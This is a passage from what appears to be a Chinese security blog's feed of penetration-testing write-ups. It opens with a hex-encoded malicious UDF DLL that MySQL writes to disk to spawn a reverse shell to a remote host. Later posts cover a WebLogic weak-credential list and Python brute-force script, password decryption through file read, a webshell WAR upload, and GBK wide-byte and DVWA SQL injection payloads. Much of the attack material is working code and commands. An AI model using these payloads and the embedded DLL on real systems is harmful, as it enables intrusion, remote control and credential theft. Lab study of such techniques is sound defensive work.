6d122a6281b1ca86fe9df66483ea1083573ee3ed4121837d4cc85f0eee2c02afc46e7be8eda706d3467c7fe6ee7fe5facaa9e6dd1249cfc92fd403a9cd43b9944656afb643cd54663281c71eaab46e2c63df9c0619d80e156f885ff9b02b676de154024d95345c770adcd7325468597b44d6b3d29bed4fafc002c7a987fd1bdb9febe59e350ce37610562d99286604b171ae985d20ff53c64a39831d93137cfc76810ca2c671715c09b2dfc52167240be4a6cdbc905ec95f8604149cbc9cf560f004c608306e2f90bc703be4d257c885bb7c6375a8a988431b1dde742064f0fc4b8d294c8b34844e383c1ca393acadf1c1da8ff9b13f4c70ed8208ee2c0670c1aed365ba0fce7d874fcc0addd9d74077e9d9cb230545ee35dacee2605b29a7f863bc58e0b2423a7b3a2326563210329a492cabc9f44406de4e8c14fb78d9059dbc286b6b27f01dbdc947caccee3675c19f54118d5ea0b98740e9102d2459c63811876d0a0ecd9bd55edaa60e4eecfbdef30a9ac33f952402a62c97dcb061d018c0fc6ee2760ca2eaadcdf6b397135c7875c47c36852076d607d4aac060812f601ac6f73dce3c7f50bb4aeb5369ebf65e14f43078de0dce84b270a743134db987b17710fc0d863a4791cee861a0a5568be977b1cf3b2e1eca312542df4324575f8c3e4661ed2b955bb7c48077d4952193496265740f6de6955e935cd67df798c2f77b645cb33ff297d90de4eee66384f8f5eaf5c761cde263c60619c1e1c09995d7799cc74689071abc4d310fc08f6d069cd4aa32e47beea8438d6b9aa9bdc100671c2e1b17e2014cbc782e2c7972bff99785bd2e4f2af6e6d7f46aaecc6958ddeabb52b4e93ca67fd2741af101cda966e83f822e29ec180c2bfb704a666fb9dde2ddbe8d389e98c3e3d360037860fce71598fd3444d133c21feddb993371f5f704d4ead8a116fbd09550382b62ffa1fa179b8b6eb1c9611f16a0bf4ec475aa9fb951c19c468f94fd1c2d3ec793bce76a50969ff8f39214de1f714633bbd8aced6b71034b95c38a640c51289794c4191499f9bf013e5aa9e9928b675e96ce2358b14abac50cde601ee9fdba355bc0d48900ded3bba6d8e761a5b36ab0b2480422889d0081a3adccf83cc621fbc5e110c2d2e9a5d9dab399a324c7d01ff7dac85933351e552b7b0fe2132b319b630f93e642aeb2af777627148aff3ebbf6dfebdd1985e91cdbe9a4b47bbc7e189cfd4a9de568d974d13b596f4b5c10a01b487e1191b8e742aa752ae89147256501e30918f7be67e03b4f4869c55817dd2358e438359b7cd22fd1affabd78518b91f3248e2d839ade3dcfaba45ab72519c5fcc6d7db4bee7840c1b2c23834c7d8079d42c4ff6b8b9291e0e5773b41b716bd6ea94ab8e8934eb81e9326737a06b320b1c98919f8654b0c6e2ce3b792f42465f4506e54900a654233b468ded6bcf7b99fe25754c35cb1c67dee159d9db365eda9fa979115b668008c15f3564401b4b74e082355a596b776ab5c14a7d998f844a48c8e1bf5406dddf8b56c6641dbf0cd68e7e98a2e8d2b829ee342ee65ae34c23b9d2823768fbd80024db4970abccdf91b0e92ae2fbeb2822633ee42dc7622e2ef9c7b0b60dcdd181e2271cef8e0a4a161c700b17c40fea711edd36ca33513d433f109c657d4b610be67f5b17ea714162dbf40e74576613a316bdc75f3572c0dc12fe3c7487249d00c5afaa4ad3d854ba763dabc807da78996e6585b9a6bcfe2956ee3691778ea9d6ee8027e309b066d67116d0c2eafcad749a4858c362aa0eb6d56a28aee9a2bdf22b401c6361d8d13818dbdb2e220ecddb361b622b3f1577fd50722b4f9523378249a4d5968bcf6214c9837991a576e07b556dedfe9d1e7613ee28e1edfd080c943e518582fcb90f41cc60e74a22953d67a042fb24b522db482529b6348645c622dda250b3506ce19c9f2cdb202a454db52f3f73be52026726147717f70b7d3872e4c945104eca84d4f652ac71e87c4b94470626784c6654fdd968dd81d472745d4720341d9307e436a92b29b1a419bf024b70700a0d2c1133c3911f081ba1bce9dd0b74499fc6da58e19165d5e452c8469aac1e2a2e5687b98e081f05e73122b7b4bac513d7ec8a940c648b44bba80076273189858549b283ab363d0eb9e8962462a24f1bbd96db00922744e9484f09aae326461e57da8679c14d41b1986f33682aa70d91efe6d0dd81b65d26000463b8c3429c8f93f0801d71ab1123611b93e5f3a7a278c363c6797957950849f39974d6193ab8fdef30087e1fc96db7c3b78c11c4be00ae617a04e27c74f5c83cc81a95a5cedb752118622f6196fb9853fce4897de28494d5d94763cacd6e8d97892fe00380a2a34fa194882958020ed4b39800b2b01306475074cca32d398589d4ca1686ee3a11b1f918b89948927ee3a097f737456cb43e774bf1913c7c7431b911071a4c4bd30e96e28f0d786d3826ee76c53cc875f5b827e203a8702bba2b4760d0f22f58e56180744172384f5abc11d833bf1201387ba60af29a88da9161af85a07eb4c30deb23732d60e82d415d6bd9eeae750b9284be41c5efab738a1ca5702686579806948960390ed4c0ca7d219eb1ed0cc479c4c516589783c784dbeb284e0d50ad2856b81737d1012273e69f91fbd05fa0ff37283cb44d10f41c44665ced2c42ccc15c365c05f2fbd5a7b99975627c99f5ba39e3dfe1a0b9b6efe4f9d859d33f7a5d9b080b1b7ae7d026c7d0c52ec3dc4a60e5cc7fd7c0faa209f46d531611d88635e8da5b6cbff371d6cdb40eaf94f44a90f5ef96d54a1c148c140feb739837c52c56119c1fbe898ab2242972e028faff901de8679f2d83d3e8094453a80f163dfd6218b72ecbee21a2770d4d0fa9cfe524e8d918d59df5e0e260686966e021d93504fe98e8a5a3113bfdc29a4732ee00c31b6b9471ffe1bdd91625ba0dc6314e2f7c6d14903995692a5730580894c6875679680d71d4470557c76cca1317fa1e3a437c0bb133b98b2b1934ec5ae18dca6b69f3854eae3e9156ed84abe3112abed69eb79c1251126e14b9b3924ee2453d7f3b216d22649464155a0591fc0af92ea6b810e66cce1db14d168161fc7883e994c7f0a5ff401e3f9c1f08439e4333f553c1b84b308ee8fbb2d13f8ff8247aef5b1ca08f1028d70840ea0aa923a1ed861e42358b7ae207a156e333d0f1aed6534b9a4e68b3922d4586598b710128e901855c95fa47bca65bdce83540d78a774028838677d6075eb1ecfd0ecec38650ccc45a05edda1a8e414056aa4db23404ee8fd9411f8f78930ca9713d6d465f95d0bc687bc39f27c2c0057a50e92a0c95e4f4b37411028a07ae76cf3260bb086ee656c033a3ef5b89fbc97996e06243d3f33851476afd328da79f62d1e95a27bf451b943766a50c238ad4b3dece8f4049686494642bca8ae162c69c48c8b9a89161572808b691c5638af59d2bf26b68af0a3adf17eed396890cfcec6e8aaa42742a5fe92073d66d3e2b7baa8f6c473e2f48e9c9e0f7b0b7f7f37399784a2937cc6dcd4871724b2d33a6be15add1908800c8cf92fde2d6fca5a2f55e46a9e2e19ce040739500b33100cce91b6da78009e61b066448dbe4226cc2fb0ee6a027112d9b2e200bf7d197889b3d0f945032488f614a6803b3119b368322825ce5b235a69a6f147ac2341195aa5f3c190eca877c3c66508d99f968d6a350290dffb9da9c4fb4f60b368d3aaa809fc127b2a0bd8eaefb1fa4ccda9d168065ecbbd4766b173e886abce1cf23053a4855e1d6e2f4fb2bf9c07c56fc6d2f27acb2ef8c2f012cc2898b56f32c02a70c5009dd8e35797717ffdcbd233256161ee254d1b1accd2b6133a5fc376babdc4c0d5811c89deadaed2ef047c6364a690fe998b944e996fcbf8c237dbeebf6d764f713a39e8e01efa008b949b13ae7e04017bf1d85071928869984bf78f6a3695586492efae813ce2c252dc92fb8db3beb32cb78a5b057ef9f6bc3524e462c121f4c6c3b29083979c85cfc73e8e5b2500e9785eaf5ea409134606c8a50f1fc68571303807ac06ef9bdc138cdaf1d545b361b25ec793a30c765de9b4199076f41da8ae675a21f321a4060eee1fc25bc992561ef6c1b332747f9b4517c316dd1d68b950c671cd3ea2e42480a0b82901058b355b59bf72d65f6eb33f3f49bb9bef7b514b908255051e8385386939423d47625377cfbe22f85b904dc6029c207a65288e98ff01f215c12507ce986939be440458c000f9475cb4b4704dacb7656330bd06485064678fc603392ecf35a512d76382232fe2889b8e0e7418e9264c0ff1120a56c63b3c08c0eb703464c1c4dd4ba417d11ddec9f67d814ee0c5df50c173b2634c8b6b18cda4d86047a47579847bd1490aca83c8be538bb02f4569d2e200daffd04a47089bbdb0acdf3d2e2772a0fb12d37485ec8883c1253bc84457f3670704b9ee898e978a5593b73aeef92f10f9020ec60cee25e327fe2055c0b29125f72ff67d28b31bdc778d74bd1c39ed6bf2c44ecc2a61ea5f742f6a0c1857001c1b07e56db98c6db1331bdc727a7dc98d2a3f5c5f7cba0c2fc783155c08e4eb337138dd2fc43c6aa607722b0cb90f6afe3f1226d31d5237851cc1dfed5dbc055027361094c50c67b7be979e07c9d5a3f698a9871ae81bcf53c70c611f5de85ccebf2a10cf7016e10483c6125ae8c5660f9269480ae025af71d8923d9ea95b20abe3c71e97e59b8278271dc5722dca6883ba3fc70dd206fb555af8206b03180dae4538642c1d88eea507d8d2cd3cf435660614f87f10cce23786e9376f51e47e4d3202499fa1e3fb3e2e0549e6ef0880fab18dd3032d55b32d484217349380806a72e46888d9b57bccc8aec8be2bd30007367de32d69c5b950fc82ae6b32bd7f512321c7bac127ffeb31c2d52c779ae836304f63cf89c2ec612cd32edec1fa2a7f9c128b6db5f064457dcc9817640a1d0edfce1776f20a4f531f59035345f668bea438eb47e0659f0b1e4180090a81653c7e5303739a6f87b51bef9491d498d1a51e9802d12842f5dd845a3dc54a82ee140424e26c6025939a116092a30a7ab03745b0e5ac7983b0c4537bcda2393ad2d6d24dc642c3e1aa38b4b83679722b97469f3f0e28d1aad08daabbdf3f0335f0abfd33b9bdcfc8f95829ca6064853ad2a2e856771e0c0c952369705cdef3b919340e086e073ddd9c9896e783f3610cb4ae23aa06d2bfc281bdf515696bdf1ae28eb7f8cb1e3280ca948e3d2c89b1ccb7f341fefc7ea193c7477e3d81df3799a685fa2dbd1aa8f7c6d164fa73f44c306fd495979b5b03ad9e29995ab445a89ee792b7cbe5c4829204d3418a29a6e5bc1375d575860f01fa456d8efe52b50f64f221b9372551a5d491ae31660c4928176d974136903e8cd04779424a9d09dec08654ba8bb880bdde1120039f89d38eccbac4436bf382e4e73956ee3b2be95a6659cb96412b14032b5676a321173882ae645390237ced2d62eeaae20f3f52e4c164ce074e0e2cad94dd4c189f19b88991aebc2cffcf522b373d7644c026fd890e0b652261af984a1469ce004fd3464b3949812bc602eeb055c72b2e645a3ace286d9e7d924b0604043e632a3ca026699de5484bcfa7001d5b479761a99eda72d51c9de7345ce00d4c35dfb044b8907fe1bbcb58f5b207aa748746af5e2837116c2f75d4371705986868f6de4e700fc56b91c86c1d3cb4c5c3c9016c3ab6379895fd56adc7c0613eba6d239df1bc48e218233b370930b9dd78627c87c89a4237b00f51b12f75227807372b3204e67138359a647bbe5e8f2f9114ca5518d4c582de609c2958058ce5cf095d5233abf344648bf2a91aa61cf13d6fcaf526e8c69d8a0cccd3aaf850798bc8802a2896a737eb791de6bf660e042843df3e8b68fca1065c5963fd128c7e8f1e9971f5a9f9d7131f075a98143a4de0e456eee823cf6988192a4e372172bdfbf7301bef7d260bb60126a1356857d698df62b5e7ac5e02b4bdc0f1eb22d953b95fa0c6b802f2235bbc31d04d11b46d2da5d8cd6d4f2fad666b3c0060e809000000bb930200e90602000033c95e870ee3f42bf18bdead2bd8ad03c35097ad91f3a55ead5691011eade2fbad8d6e10015d008d7d1cb51cf3ab5ead53505197588d54855cff1672572c037302b0003c0772022c03500fb65fffc1e303b3008d1c5b8d9c9d0c100000b001e3298bd72b550c8a2a33d284e90f95c652fec68ad08d1493ff165a9f12c0d0e9740e9e1af274e4b40033c9b501ff560833c9ff661cb1308b5d0c03d1ff16734c03d1ff16721903d1ff1672293c07b0097202b00b508bc72b450c8a00ff661883c260ff16875d10730c03d1ff16875d147303875d183c07b0087202b00b50538bd5035638ff560c5b91ff66303c07b0077202b00a50875d10875d14895d188bd503563cff560c6a035950483bc172028bc1c1e006b1408d9c857c030000ff56043c048bd8725f33dbd1e813db48439143d3e380f9058d949d7c010000762e80e90433c08b5500d16d088b120fca2b550403c03b550872078b550840015504ff5610e2e0b104d3e003d88d551c33c0534051d3e08bda91ff560433d259d1e813d2e2fa5b03da4359895d0c568bf72bf3f3a4ac5eb180aa3b7e247303ff6620588b4e405f5a57e31b8a074704183c0273f78b073c0775f1b0000fc80346142bc7abe2e58b5e2856528b762c46ad85c05a742203c2525697ff53fc95ac84c075fb380674e78bc679054633c066ad5055ff13abebe7595f8b4944e30d33c0ac3c04720c03f80117e2f361e9e89bfdff2c017208740ac1e008acebe866adebe4adebe1508b450852c1e80bf7228b55008b120fca2b55043bc25a761089450833c0b4082b02c1e8050102eb0e0145042945088b02c1e8052902f9589c807d0b00750bff4500c1650408c16508089dc333c0408d1483ff1613c03bc172f52bc1c3b108ff168d5204b001730bff16b0097305c1e105b011508d1c82ff56045b03c3c30e0000001e00000000000000000000000000000002000000e99702000000000000000000000000000000000000000000010000001e0000001e00000031980200e5980200a99802006022000060290000b0240000c024000060290000b0240000802c000060290000b02400008029000060290000b02400002010000060290000b02400003014000060290000b02400009016000060290000b0240000601b000060290000b0240000b01e000060290000b0240000a026000060290000b024000000000100020003000400050006000700080009000a000b000c000d000e000f0010001100120013001400150016001700180019001a001b001c001d005d990200699902007c9902008d99020099990200ac990200bd990200c3990200d0990200db990200e5990200f6990200059a02000e9a02001e9a02002c9a0200379a0200499a0200599a0200629a0200729a0200809a0200889a0200979a0200a49a0200ad9a0200bd9a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400); create table Ghost(data LONGBLOB); insert into Ghost values(&quot;&quot;); update Ghost set data = @a; select data from Ghost into DUMPFILE &#39;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#39;; 成功上传后执行blackshell函数 CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;#导入blackshell函数 select backshell(&#39;192.168.220.141&#39;,12345);#反弹shell 执行成功 lv@ubuntu:~$ nc -vv -l -p 12345 Listening on [0.0.0.0] (family 0, port 12345) Connection from [192.168.220.141] port 12345 [tcp/*] accepted (family 2, sport 7157) Microsoft Windows [�汾 10.0.17134.885] (c) 2018 Microsoft Corporation����������Ȩ���� C:\phpStudy\PHPTutorial\MySQL\data&gt;whoami whoami desktop-6sk3as1\123456 C:\phpStudy\PHPTutorial\MySQL\data&gt;]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[weblogic复现之weak_password]]></title>
    <url>%2F2019%2F07%2F17%2Fweblogic-fu-xian-zhi-weak-password%2F</url>
    <content type="text"><![CDATA[前言这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。 漏洞复现Docker安装(Ubuntu 16.04)vulhub安装环境部署 进入weblogic中的weak_password环境目录 cd vulhub-master/weblogic/weak_password 构建服务 sudo docker-compose build 启动环境 sudo docker-compose up -d 进入网址，查看是否部署成功 http://your-ip:7001/console 本环境弱口令账号密码为 账号： weblogic 密码： Oracle@123 weak_passwordWeblogic常见弱口令总结 system:password weblogic:weblogic admin:secruity joe:password mary:password system:sercurity wlcsystem:wlcsystem weblogic:Oracle@123 Burpsuite爆破 访问后台登录地址，输入任意账号密码，Burpsuite抓包 点击右键，将其转发到Intruder模块下,设置数据 开始爆破 Python脚本爆破Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。 脚本如下： import requests def weakPasswd(): pwddict = [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;] for user in pwddict: for pwd in pwddict: data = { &#39;j_username&#39;:user, &#39;j_password&#39;:pwd, &#39;j_character_encoding&#39;:&#39;UTF-8&#39; } #这个位置设置目标地址 req = requests.post(&#39;http://your-ip&#39;+&#39;:7001/console/j_security_check&#39;, data=data) if req.status_code == 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text: print(&#39;[+] WebLogic username: &#39;+user+&#39; password: &#39;+pwd) weakPasswd() 配合任意文件下载/读取漏洞来破解密码如果没有弱口令漏洞怎么办呢？ 刚巧，这个环境下存在一个任意文件下载漏洞。 漏洞地址： http://your-ip:7001/hello/file.jsp?path= 读取后台用户密文与密钥文件 Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。 这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。 Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图： 现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图： 此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的 标签下，如图： 使用工具对后台密码进行破解 现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的 标签中的内容，全部输入完成后，点击确定，开始破解。 上传shell 制作war包 将webshell压缩成zip格式，修改后缀名为war即可 上传war包 点击“部署”，“安装” 上载文件 选择文件，下一步 下一步，“将此部署安装为应用程序” 命名 下一步，完成，保存 get shell]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC2019-Web]]></title>
    <url>%2F2019%2F05%2F16%2Fiscc2019-web%2F</url>
    <content type="text"><![CDATA[web1源码&lt;?php error_reporting(0); require &#39;flag.php&#39;; $value = $_GET[&#39;value&#39;]; $password = $_GET[&#39;password&#39;]; $username = &#39;&#39;; for ($i = 0; $i &lt; count($value); ++$i) { if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) { echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL; echo $flag, &#39;&lt;hr&gt;&#39;; } } 需要传入两个变量value和password. count():返回数组中元素的数目unset():销毁指定的变量chr():返回相对应于 ascii 所指定的单个字符.= : 拼接字符串intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 解题思路$username == &#39;w3lc0me_To_ISCC2019&#39;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker复现ctf]]></title>
    <url>%2F2019%2F05%2F13%2Fdocker-fu-xian-ctf%2F</url>
    <content type="text"><![CDATA[docker复现ctf0x00 docker常用命令 拉取镜像 docker pull [image] 查看docker当前镜像 docker image ls docker images 新建docker容器，并映射端口号 docker run -d -p [host port]:[docker port][image] 查看运行中的docker容器 docker ps -a 进入一个docker容器 docker exec -it [container id] bash 拷贝本地文件到docker docker cp [本地路径] [container id]:[container 路径] 启动/停止一个docker容器 docker start [container id] docker stop [container id] 删除一个docker容器（注意:在镜像对应的容器后才可以删除镜像ID） docker rm [container id] 0x01 使用docker搭建一道简单的ctf题目 搜索lamp环境的docker镜像 docker search lamp 拉取“tutum/lamp”镜像 docker pull tutum/lamp 拉取完成以后，查看本地docker镜像 docker images 新建一个docker容器 docker run -d -p 100:80 -p 3307:3306 tutum/lamp -d //容器后台运行 -p //指定映射端口 查看系统中运行的docker容器 docker ps -a 使用浏览器访问一下主页，查看映射是否正常 将ctf题目源码拷贝到container的主目录中 docker cp test_ctf/ a47e911ecebf:/var/www/html/ 进入docker container docker exec -it a47e911ecebf bash -i //让容器的标准输入保持打开 -t //让docker分配一个伪终端并绑定到容器的标准输出上 进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等。（数据库密码为空） mysql -uroot -p 到这里，这个ctf题目就搭建好了，我们访问一下]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宽字节注入]]></title>
    <url>%2F2019%2F04%2F29%2Fkuan-zi-jie-zhu-ru%2F</url>
    <content type="text"><![CDATA[前言宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。 GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节 GBK编码: utf-8编码：转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等。 宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是運，从而使单引号闭合（逃逸），进行注入攻击。 以下是数据的变化过程: %df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運’ ​ 用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql 环境搭建及分析demo1链接：https://pan.baidu.com/s/1cMFtCpbbaocMjaWJx7YLcQ 密码：ykve数据库名为test，数据库的编码全部为gbk。将index.php放到phpStudy的WWW目录下，将test.sql文件导入到数据库中即可核心源码： &lt;?php //连接数据库部分，注意使用了gbk编码 $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;) or die(&#39;bad!&#39;); mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;); mysql_select_db(&#39;test&#39;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;); //执行sql语句 $id = isset($_GET[&#39;id&#39;]) ? addslashes($_GET[&#39;id&#39;]) : 1; $sql = &quot;SELECT * FROM news WHERE tid=&#39;{$id}&#39;&quot;; $result = mysql_query($sql, $conn) or die(mysql_error()); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;gbk&quot; /&gt; &lt;title&gt;宽字节测试&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;test.php&quot; method=&quot;get&quot;&gt; &lt;b&gt;请输入值：&lt;/b&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot;/&gt; &lt;/form&gt; &lt;?php $row = mysql_fetch_array($result, MYSQL_ASSOC); echo &quot;&lt;h2&gt;{$row[&#39;title&#39;]}&lt;/h2&gt;&lt;p&gt;{$row[&#39;content&#39;]}&lt;p&gt;\n&quot;; mysql_free_result($result); ?&gt; &lt;/body&gt; &lt;/html&gt; sql语句是SELECT * FROM news WHERE tid=&#39;{$id}根据id从数据库表中获取信息。 单纯加上单引号没有报错，说明addslashes函数发挥了作用，将&#39; –&gt; \&#39;，这样就不会存在注入了。执行的SQL语句是：SELECT * FROM news WHERE tid=&#39;1\&#39;&#39; 此时，在单引号前面加上前面讲的%df,使mysql认为%df\是一个汉字，这样’就可以逃逸出来，使tid=&#39;1&#39;闭合。 这时候，按说是可以构造查询语句了，可是为什么还在报错呢，因为tid=&#39;1&#39;后面的&#39;没有闭合，需要使用注释符号(– ‘或#)将这个多余的’注释掉，这样就可以构造注入语句了。 执行的SQL语句是：SELECT * FROM news WHERE tid=&#39;-1 運&#39; -- \&#39;&#39; 下面就可以按照手动注入的思路进行数据的获取了。 确定表的字段数经过order by查询，测得字段为3. 确定字段的显示位显示位：表中数据第几位的字段可以 显示，因为并不是所有的查询结果都 会展示在页面中，因此需要探测页面 中展示的查询结果是哪一列的结果; union select 1,2,3 通过显示的数字可以判断那些字段可以显示出来。 执行的SQL语句是：SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,3 -- \&#39;&#39; id的值要用-1或者该表中没有用过的id值，否则测试值会被覆盖。 获取当前数据库信息现在只有两个字段可以显示信息，显然在后面的查询数据中，两个字段是不够用，可以使用：group_concat()函数（可以把查询出来的多行数据连接起来在一个字段中显示） database()函数：查看当前数据库名称 version()函数：查看数据库版本信息 user():返回当前数据库连接使用的用户 char():将十进制ASCII码转化成字符。 执行的SQL语句：SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(database()) -- \&#39;&#39; 当前数据库名为’test’。 获取test数据库中的表信息Mysql有一个系统的数据库information_schema,里面保存着所有数据库的相关信息，使用该表完成注入 执行的SQL语句：SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=test -- \&#39;&#39; 由于存在addslashes转义了单引号，如果在table_schema中继续使用单引号包裹数据库名字，就会报错，这时候需要使用十六进制编码来避免这个问题。 获取admin表的字段column_name表示获取字段名 执行的SQL语句：SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=admin -- \&#39;&#39; table_name需要使用十六进制编码 获取admin表的数据 执行的SQL语句：SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(uid,name,pass) from admin -- \&#39;&#39; demo2题目地址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1简单尝试一下： 很明显的宽字节注入。 判断列数：经过order by测试，列数为2 库名：当前数据库 表名： 列名由于不知道flag在哪个表中，只能一个个去试。。。最终在ctf4中得到flag。 爆数据 小结上面的题目用SQLmap也能跑出来，不过作为一个手工党，基本的手工注入还是要会的。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之SQL Injecion]]></title>
    <url>%2F2019%2F04%2F22%2Fdvwa-zhi-sql-injecion%2F</url>
    <content type="text"><![CDATA[前言SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。 手工注入的基本步骤 判断是否存在注入，注入是字符型还是数字型 猜解SQL查询语句中的字段数 确定显示的字段顺序 获取当前数据库 获取数据库中的表 获取表中的字段名 下载数据 Low核心代码&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。 漏洞利用现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。 判断是否存在注入，注入是字符型还是数字型输入 1 ，查询成功 输入 1&#39; and &#39;1&#39;=&#39;2，查询失败， 输入 1&#39; or &#39;1234&#39;=&#39;1234，查询成功，返回多个结果 说明存在字符型注入。 猜解SQL查询语句中的字段数输入1&#39; or 1=1 order by 1 #，查询成功： 输入1&#39; or 1=1 order by 3 #，查询失败： 输入1&#39; or 1=1 order by 2 #，查询成功： 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 确定显示的字段顺序输入1’ union select 1,2 #，查询成功： 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… 获取当前数据库输入1&#39; union select 1,database() #，查询成功： 说明当前的数据库为dvwa。 获取数据库中的表输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，查询成功： 说明数据库dvwa中一共有两个表，guestbook与users。 获取表中的字段名 Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); // Get 